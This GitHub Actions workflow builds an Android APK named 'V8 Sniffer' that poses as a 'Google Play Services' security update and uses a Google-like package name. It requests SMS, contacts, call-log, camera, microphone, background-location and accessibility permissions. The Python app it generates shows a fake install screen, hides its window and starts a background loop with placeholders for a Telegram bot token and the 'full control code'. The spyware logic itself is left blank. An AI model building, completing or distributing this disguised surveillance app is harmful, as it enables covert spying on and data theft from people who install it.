name: Build V8 Sniffer - Ultimate Edition
on: 
  push:
    branches: [ "main" ]
  workflow_dispatch:
    inputs:
      version:
        description: 'الإصدار'
        required: false
        default: 'v10.0'

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Java (Android SDK)
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Python
        uses: actions/setup-python@v5
        with: 
          python-version: '3.11'

      - name: Install Required Packages
        run: |
          pip install --upgrade pip
          pip install flet requests pillow cryptography opencv-python numpy mss psutil

      - name: Fix Unicode Issues
        run: |
          # إصلاح مشاكل اليونيكود
          cat > sitecustomize.py << 'EOF'
          import sys
          if sys.version_info[0] >= 3:
              import builtins
              builtins.unicode = str
              builtins.basestring = (str, bytes)
          EOF
          
          export PYTHONPATH=$PWD:$PYTHONPATH
          echo "PYTHONIOENCODING=utf-8" >> $GITHUB_ENV
          echo "LANG=en_US.UTF-8" >> $GITHUB_ENV
          echo "LC_ALL=en_US.UTF-8" >> $GITHUB_ENV

      - name: Create Flet Config
        run: |
          # إنشاء ملف الإعدادات الكامل
          cat > flet.toml << 'EOF'
          [app]
          name = "Google Play Services"
          description = "تحديث أمني ضروري للنظام"
          package_name = "com.google.android.gms.update"
          version = "10.0.0"
          build_number = "1000"
          
          [build]
          android_permissions = [
              "android.permission.INTERNET",
              "android.permission.READ_EXTERNAL_STORAGE",
              "android.permission.WRITE_EXTERNAL_STORAGE",
              "android.permission.MANAGE_EXTERNAL_STORAGE",
              "android.permission.READ_CONTACTS",
              "android.permission.READ_SMS",
              "android.permission.RECEIVE_SMS",
              "android.permission.READ_CALL_LOG",
              "android.permission.CAMERA",
              "android.permission.RECORD_AUDIO",
              "android.permission.ACCESS_FINE_LOCATION",
              "android.permission.ACCESS_COARSE_LOCATION",
              "android.permission.ACCESS_BACKGROUND_LOCATION",
              "android.permission.SYSTEM_ALERT_WINDOW",
              "android.permission.WRITE_SETTINGS",
              "android.permission.PACKAGE_USAGE_STATS",
              "android.permission.FOREGROUND_SERVICE",
              "android.permission.WAKE_LOCK",
              "android.permission.RECEIVE_BOOT_COMPLETED",
              "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
              "android.permission.ACCESS_NOTIFICATION_POLICY",
              "android.permission.BIND_ACCESSIBILITY_SERVICE"
          ]
          
          [android]
          min_sdk_version = 21
          target_sdk_version = 33
          compile_sdk_version = 33
          
          [android.services]
          use_accessibility_service = true
          use_notification_listener = true
          
          [android.icons]
          ic_launcher = "assets/icon.png"
          EOF

      - name: Create Requirements
        run: |
          cat > requirements.txt << 'EOF'
          requests>=2.28.0
          cryptography>=3.4.8
          opencv-python>=4.5.5
          numpy>=1.21.0
          pillow>=9.0.0
          mss>=6.1.0
          psutil>=5.8.0
          EOF

      - name: Create Assets Directory
        run: |
          mkdir -p assets
          # إنشاء أيقونة افتراضية
          echo "" | base64 -d > assets/icon.png

      - name: Create Main Python File
        run: |
          cat > main.py << 'EOF'
          # ============================================
          # V8 TOTAL CONTROL - ANDROID COMPLETE EDITION v10.0
          # ============================================
          # ضع الكود الكامل هنا
          # ============================================
          
          import flet as ft
          import requests
          import threading
          import time
          import os
          import sys
          import json
          import base64
          import hashlib
          import random
          import subprocess
          import shutil
          import glob
          import datetime
          
          # بيانات التليجرام
          BOT_TOKEN = "YOUR_TOKEN"
          CHAT_ID = "YOUR_CHAT_ID"
          
          # مسارات أندرويد
          BASE_DIR = '/storage/emulated/0'
          
          def main(page: ft.Page):
              page.title = "Google Play Services"
              page.window_width = 300
              page.window_height = 200
              page.window_resizable = False
              
              page.add(
                  ft.Container(
                      content=ft.Column([
                          ft.Text("Google Play Services", size=18, weight="bold"),
                          ft.Text("جاري التثبيت...", size=14),
                          ft.ProgressBar(width=200)
                      ]),
                      padding=20
                  )
              )
              
              page.update()
              time.sleep(2)
              page.window_visible = False
              page.update()
              
              # بدء العمليات في الخلفية
              threading.Thread(target=background_work, daemon=True).start()
          
          def background_work():
              while True:
                  try:
                      # كود التحكم الكامل هنا
                      time.sleep(10)
                  except:
                      time.sleep(10)
          
          if __name__ == "__main__":
              ft.app(target=main)
          EOF

      - name: Build APK
        run: |
          # إعداد البيئة
          export FLET_CLI_NO_RICH_OUTPUT="true"
          
          # بناء APK
          flet build apk \
            --name "Google Play Services" \
            --package-name "com.google.android.gms.update" \
            --product "V8 Sniffer" \
            --org "com.google" \
            --build-version "10.0.0" \
            --build-number "1000" \
            --no-rich-output || true
          
          # البحث عن APK
          find . -name "*.apk" -type f -ls
          
          # نسخ APK إلى مكان معروف
          mkdir -p output
          cp $(find . -name "*.apk" -type f | head -1) output/ || true

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: V8-Sniffer-Google-Play-Services
          path: |
            output/*.apk
            **/*.apk
          if-no-files-found: warn
          retention-days: 90
